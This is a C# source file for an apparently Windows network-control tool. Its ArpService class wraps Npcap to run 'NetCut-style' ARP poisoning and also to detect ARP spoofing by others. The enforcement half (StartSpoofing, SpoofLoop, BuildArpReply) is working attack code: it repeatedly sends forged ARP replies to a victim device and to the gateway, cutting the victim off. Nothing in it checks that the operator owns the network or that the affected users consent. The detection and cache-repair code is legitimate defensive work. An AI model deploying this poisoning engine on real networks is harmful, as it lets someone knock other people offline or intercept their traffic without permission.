using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using SharpPcap;
using SharpPcap.LibPcap;
using NetControl.Models;

namespace NetControl.Services;

public class ArpAlert
{
    public string SenderIp { get; set; } = "";
    public string ClaimedMac { get; set; } = "";
    public string ExpectedMac { get; set; } = "";
    public string Source { get; set; } = "";   // "Passive capture" / "Active probe"
    public string Detail { get; set; } = "";
}

/// <summary>
/// ARP engine built on Npcap (via SharpPcap):
///  - enforcement: sends crafted ARP replies that make a LAN device's traffic stop
///    reaching the gateway (NetCut-style blocking), with corrective restore;
///  - detection: passive capture + periodic active probes to catch ARP spoofing
///    performed by anyone else on the network.
/// Requires Npcap installed; sending requires Administrator rights.
/// </summary>
public class ArpService : IDisposable
{
    private readonly SynchronizationContext _sync;
    private readonly object _gate = new();

    private LibPcapLiveDevice _device;
    private AdapterInfo _boundAdapter;

    // victim MAC -> spoof session
    private readonly ConcurrentDictionary<string, SpoofSession> _sessions = new();

    public bool NpcapAvailable { get; private set; }
    public bool NpcapDevicesFound { get; private set; }
    public bool IsCapturing { get; private set; }
    public string LastError { get; private set; } = "";

    public string GatewayIp { get; set; } = "";
    public string GatewayMac { get; private set; } = "";
    public string LocalMac { get; private set; } = "";

    public int ActiveSpoofCount => _sessions.Count;
    public IReadOnlyCollection<string> SpoofedMacs => _sessions.Keys.ToList().AsReadOnly();

    public event Action<ArpAlert> ArpSpoofDetected;
    public event Action<string> StatusChanged;
    public event Action SpoofStateChanged;

    public ArpService()
    {
        _sync = SynchronizationContext.Current ?? new SynchronizationContext();
        ProbeNpcap();
    }

    private void ProbeNpcap()
    {
        try
        {
            var list = CaptureDeviceList.Instance;
            NpcapAvailable = list.Count > 0;
            NpcapDevicesFound = NpcapAvailable;
            if (!NpcapAvailable)
                LastError = "Npcap is installed but no capture devices were found.";
        }
        catch (Exception ex)
        {
            NpcapAvailable = false;
            NpcapDevicesFound = false;
            LastError = "Npcap not available. ARP enforcement and passive detection are disabled. " +
                        "Install Npcap from https://npcap.com and restart NetControl. (" +
                        ex.GetType().Name + ")";
        }
    }

    public string GetStatusText()
    {
        if (!NpcapAvailable) return "Npcap missing - ARP features disabled";
        var parts = new List<string> { $"Interface: {(string.IsNullOrEmpty(_boundAdapter?.Name) ? "not bound" : _boundAdapter.Name)}" };
        if (IsCapturing) parts.Add("monitoring");
        parts.Add($"{_sessions.Count} active block session(s)");
        if (!NetworkHelper.IsAdmin()) parts.Add("Administrator rights needed to send ARP packets");
        return string.Join(", ", parts);
    }

    // ================= Device binding =================

    /// <summary>Binds to the physical NIC matching the given adapter (by MAC address).</summary>
    public bool BindAdapter(AdapterInfo adapter)
    {
        Unbind();
        if (!NpcapAvailable || adapter == null) return false;
        try
        {
            var wanted = ParseMac(adapter.Mac);
            if (wanted == null) return false;

            foreach (var dev in CaptureDeviceList.Instance.OfType<LibPcapLiveDevice>())
            {
                var devMac = dev.MacAddress?.GetAddressBytes();
                if (devMac == null || devMac.Length != 6) continue;
                if (!devMac.SequenceEqual(wanted)) continue;

                dev.Open();
                _device = dev;
                _boundAdapter = adapter;
                LocalMac = adapter.Mac;
                StatusChanged?.Invoke($"ARP engine bound to {adapter.Name}");
                return true;
            }
            LastError = $"No Npcap device matches adapter '{adapter.Name}' ({adapter.Mac}).";
            return false;
        }
        catch (Exception ex)
        {
            LastError = $"Failed to open Npcap device: {ex.Message}";
            _device = null;
            return false;
        }
    }

    public void Unbind()
    {
        StopAllSpoofing().Wait(5000);
        StopMonitoring();
        try { _device?.Close(); } catch { }
        _device = null;
        _boundAdapter = null;
    }

    public bool IsBound => _device != null;

    // ================= Enforcement (NetCut-style blocking) =================

    public bool CanEnforce(string mac) =>
        NpcapAvailable && IsBound && NetworkHelper.IsAdmin() && _device != null;

    public string EnforceBlockStatus =>
        !NpcapAvailable ? "Blocked: Npcap not installed"
        : !IsBound ? "Blocked: no capture interface bound"
        : !NetworkHelper.IsAdmin() ? "Blocked: run NetControl as Administrator"
        : "Ready";

    /// <summary>Starts continuous ARP poisoning that cuts the victim off from the gateway.</summary>
    public bool StartSpoofing(string victimMac, string victimIp)
    {
        if (!CanEnforce(victimMac))
        {
            LastError = EnforceBlockStatus;
            StatusChanged?.Invoke(LastError);
            return false;
        }
        if (string.IsNullOrEmpty(GatewayIp) || string.IsNullOrEmpty(GatewayMac))
        {
            LastError = "Gateway IP/MAC unknown - cannot start ARP blocking.";
            return false;
        }

        var mac = NetworkHelper.NormalizeMac(victimMac);
        if (string.IsNullOrEmpty(mac)) return false;

        lock (_gate)
        {
            if (_sessions.ContainsKey(mac)) return true; // already blocking

            var victimMacBytes = ParseMac(mac);
            var myMac = ParseMac(LocalMac);
            if (victimMacBytes == null || myMac == null) return false;

            var session = new SpoofSession
            {
                VictimMac = mac,
                VictimIp = victimIp,
                Cts = new CancellationTokenSource()
            };
            var token = session.Cts.Token;
            session.Thread = new Thread(() => SpoofLoop(victimMacBytes, myMac, victimIp, token))
            {
                IsBackground = true,
                Name = $"NetControl-Spoof-{mac}"
            };
            _sessions[mac] = session;
            session.Thread.Start();
        }

        StatusChanged?.Invoke($"ARP blocking started for {victimIp} ({mac})");
        RaiseSpoofChanged();
        return true;
    }

    private void SpoofLoop(byte[] victimMac, byte[] myMac, string victimIp, CancellationToken token)
    {
        while (!token.IsCancellationRequested)
        {
            try
            {
                // 1) Tell the victim that the gateway IP lives at OUR mac -> its packets stop at us.
                var gwIp = ParseIp(GatewayIp);
                if (gwIp != null)
                    SendPacket(BuildArpReply(myMac, victimMac, gwIp, myMac, gwIp));

                // 2) Tell the gateway that the victim IP lives at OUR mac -> return traffic stops too.
                if (!string.IsNullOrEmpty(victimIp))
                {
                    var victimIpBytes = ParseIp(victimIp);
                    var gwMac = ParseMac(GatewayMac);
                    if (victimIpBytes != null && gwMac != null)
                        SendPacket(BuildArpReply(myMac, gwMac, victimIpBytes, myMac, victimIpBytes));
                }
            }
            catch (Exception ex)
            {
                LastError = $"ARP send failed: {ex.Message}";
            }

            try { token.WaitHandle.WaitOne(_spoofIntervalMs); } catch { }
        }
    }

    /// <summary>Stops spoofing a device and repairs the ARP caches of victim and gateway.</summary>
    public bool StopSpoofing(string victimMac, string victimIp)
    {
        var mac = NetworkHelper.NormalizeMac(victimMac);
        if (string.IsNullOrEmpty(mac)) return false;

        lock (_gate)
        {
            if (_sessions.TryRemove(mac, out var session))
            {
                try { session.Cts.Cancel(); } catch { }
            }
        }

        // Repair: broadcast the truth a few times.
        if (!string.IsNullOrEmpty(GatewayIp) && !string.IsNullOrEmpty(GatewayMac))
        {
            var victimMacBytes = ParseMac(mac);
            var gwMac = ParseMac(GatewayMac);
            var myMac = ParseMac(LocalMac);
            if (victimMacBytes != null && gwMac != null && myMac != null)
            {
                try
                {
                    var gwIp = ParseIp(GatewayIp);
                    for (int i = 0; i < 5; i++)
                    {
                        // victim: gateway really is at gateway MAC
                        if (gwIp != null)
                            SendPacket(BuildArpReply(myMac, victimMacBytes, gwIp, gwMac, gwIp));
                        // gateway: victim IP belongs to victim MAC (if we know it)
                        if (!string.IsNullOrEmpty(victimIp))
                        {
                            var vip = ParseIp(victimIp);
                            if (vip != null)
                                SendPacket(BuildArpReply(myMac, gwMac, vip, victimMacBytes, vip));
                        }
                        Thread.Sleep(120);
                    }
                }
                catch (Exception ex)
                {
                    LastError = $"ARP restore failed: {ex.Message}";
                }
            }
        }

        StatusChanged?.Invoke($"ARP blocking stopped for {mac}; caches repaired");
        RaiseSpoofChanged();
        return true;
    }

    public async Task StopAllSpoofing()
    {
        var keys = _sessions.Keys.ToList();
        foreach (var k in keys)
        {
            var ip = _sessions.TryGetValue(k, out var s) ? s.VictimIp : "";
            await Task.Run(() => StopSpoofing(k, ip));
        }
    }

    private int _spoofIntervalMs = 1000;

    public void SetSpoofInterval(int ms)
    {
        // Applied on the next wait cycle of every running session.
        _spoofIntervalMs = Math.Clamp(ms, 200, 10000);
    }

    private void SendPacket(byte[] packet)
    {
        var dev = _device;
        if (packet == null || dev == null) return;
        try { dev.SendPacket(packet); } catch { }
    }

    // ================= Detection =================

    /// <summary>Records the true gateway MAC (active probe) as the detection baseline.</summary>
    public string LearnGatewayMac(string gatewayIp)
    {
        GatewayIp = gatewayIp ?? "";
        if (string.IsNullOrEmpty(gatewayIp)) return "";
        // Ask directly and cross-check with the local ARP cache.
        var mac = NetworkHelper.ResolveMac(gatewayIp);
        if (string.IsNullOrEmpty(mac))
        {
            var table = NetworkHelper.GetArpTable();
            table.TryGetValue(gatewayIp, out mac);
        }
        GatewayMac = NetworkHelper.NormalizeMac(mac) ?? "";
        return GatewayMac;
    }

    /// <summary>Allows the security layer to update the baseline when no Npcap capture is running.</summary>
    public void SetGatewayMacBaseline(string mac) =>
        GatewayMac = NetworkHelper.NormalizeMac(mac) ?? "";

    public void StartMonitoring()
    {
        if (!NpcapAvailable || _device == null || IsCapturing) return;
        try
        {
            _device.OnPacketArrival += OnPacketArrival;
            _device.StartCapture();
            IsCapturing = true;
            StatusChanged?.Invoke("Passive ARP monitoring started");
        }
        catch (Exception ex)
        {
            LastError = $"Capture failed: {ex.Message}";
            IsCapturing = false;
        }
    }

    public void StopMonitoring()
    {
        if (!IsCapturing || _device == null) return;
        try
        {
            _device.StopCapture();
            _device.OnPacketArrival -= OnPacketArrival;
        }
        catch { }
        IsCapturing = false;
        StatusChanged?.Invoke("Passive ARP monitoring stopped");
    }

    private void OnPacketArrival(object sender, SharpPcap.PacketCapture e)
    {
        try
        {
            var raw = e.GetPacket();
            var data = raw.Data;
            if (data == null || data.Length < 42) return;
            if (data[12] != 0x08 || data[13] != 0x06) return;      // not ARP
            int opcode = (data[20] << 8) | data[21];
            if (opcode != 2 && opcode != 1) return;                // want ARP with sender mapping

            var senderMac = FormatMac(data, 22);
            var senderIp = IpAt(data, 28);
            if (senderMac == null || senderIp == null) return;
            if (senderMac.Equals(LocalMac, StringComparison.OrdinalIgnoreCase)) return; // our own spoofs
            if (NetworkHelper.IsBroadcastMac(senderMac)) return;

            // Spoofing signature: someone claims the gateway IP with a different MAC.
            if (!string.IsNullOrEmpty(GatewayIp) && !string.IsNullOrEmpty(GatewayMac) &&
                senderIp == GatewayIp &&
                !senderMac.Equals(GatewayMac, StringComparison.OrdinalIgnoreCase))
            {
                // Confirm with an active probe before alerting (reduces false positives).
                var confirmed = NetworkHelper.ResolveMac(GatewayIp);
                var alert = new ArpAlert
                {
                    SenderIp = senderIp,
                    ClaimedMac = senderMac,
                    ExpectedMac = GatewayMac,
                    Source = "Passive capture",
                    Detail = confirmed.Length > 0
                        ? $"Active probe currently answers {confirmed}"
                        : "Active probe inconclusive"
                };
                _sync.Post(_ => ArpSpoofDetected?.Invoke(alert), null);
            }
        }
        catch { }
    }

    /// <summary>Active check: probe the gateway now and compare with the learned baseline.</summary>
    public ArpAlert ProbeGateway()
    {
        if (string.IsNullOrEmpty(GatewayIp) || string.IsNullOrEmpty(GatewayMac)) return null;
        var now = NetworkHelper.ResolveMac(GatewayIp);
        if (string.IsNullOrEmpty(now)) return null;
        now = NetworkHelper.NormalizeMac(now);
        if (now.Equals(GatewayMac, StringComparison.OrdinalIgnoreCase)) return null;

        return new ArpAlert
        {
            SenderIp = GatewayIp,
            ClaimedMac = now,
            ExpectedMac = GatewayMac,
            Source = "Active probe",
            Detail = "Gateway MAC differs from the learned baseline"
        };
    }

    // ================= Raw frame helpers =================

    private static byte[] ParseMac(string mac)
    {
        mac = NetworkHelper.NormalizeMac(mac);
        if (string.IsNullOrEmpty(mac)) return null;
        var bytes = new byte[6];
        var parts = mac.Split(':');
        for (int i = 0; i < 6; i++)
        {
            if (!byte.TryParse(parts[i], System.Globalization.NumberStyles.HexNumber, null, out bytes[i]))
                return null;
        }
        return bytes;
    }

    private static byte[] ParseIp(string ip)
    {
        if (string.IsNullOrWhiteSpace(ip) ||
            !System.Net.IPAddress.TryParse(ip, out var addr) ||
            addr.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork)
            return null;
        return addr.GetAddressBytes();
    }

    private static string FormatMac(byte[] data, int offset) =>
        string.Join(":", Enumerable.Range(0, 6).Select(i => data[offset + i].ToString("X2")));

    private static string IpAt(byte[] data, int offset) =>
        $"{data[offset]}.{data[offset + 1]}.{data[offset + 2]}.{data[offset + 3]}";

    /// <summary>Builds a full Ethernet + ARP reply frame (14 + 28 bytes).</summary>
    private static byte[] BuildArpReply(byte[] srcMac, byte[] dstMac, byte[] senderIp, byte[] senderMac, byte[] targetIp)
    {
        var p = new byte[42];
        Array.Copy(dstMac, 0, p, 0, 6);
        Array.Copy(srcMac, 0, p, 6, 6);
        p[12] = 0x08; p[13] = 0x06;              // Ethertype: ARP
        p[14] = 0x00; p[15] = 0x01;              // Hardware type: Ethernet
        p[16] = 0x08; p[17] = 0x00;              // Protocol type: IPv4
        p[18] = 6; p[19] = 4;                    // Sizes
        p[20] = 0x00; p[21] = 0x02;              // Opcode: reply
        Array.Copy(senderMac, 0, p, 22, 6);
        Array.Copy(senderIp, 0, p, 28, 4);
        Array.Copy(dstMac, 0, p, 32, 6);
        if (targetIp != null) Array.Copy(targetIp, 0, p, 38, 4);
        return p;
    }

    private void RaiseSpoofChanged() => _sync.Post(_ => SpoofStateChanged?.Invoke(), null);

    public void Dispose()
    {
        try { Unbind(); } catch { }
    }

    private class SpoofSession
    {
        public string VictimMac;
        public string VictimIp;
        public Thread Thread;
        public CancellationTokenSource Cts;
    }
}
